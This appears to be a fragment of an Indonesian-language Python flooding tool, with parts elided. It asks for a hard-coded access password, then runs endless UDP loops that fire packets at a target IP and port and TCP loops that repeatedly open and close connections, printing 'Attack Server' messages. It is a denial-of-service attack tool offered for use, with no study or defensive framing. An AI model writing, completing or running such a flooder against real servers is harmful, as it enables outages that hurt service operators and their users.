...
print("Masukan Pasword Untuk Use Tools")
password = input("[ + ] Masukan Kode Akses : ")
if password == "anm2892":
    print("Pasword Benar")
    time.sleep(2)
else :
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(" [+] Attack Server %s Port %s"%(ip,port))
		except:
			print(" [+] Attack Server %s Port %s"%(ip,port))
...
def tcp():
	...
	while True:
		try:
			...
			s.close()
			print("\033[1;31;40m [-] Server turu %s port %s"%(ip,port))
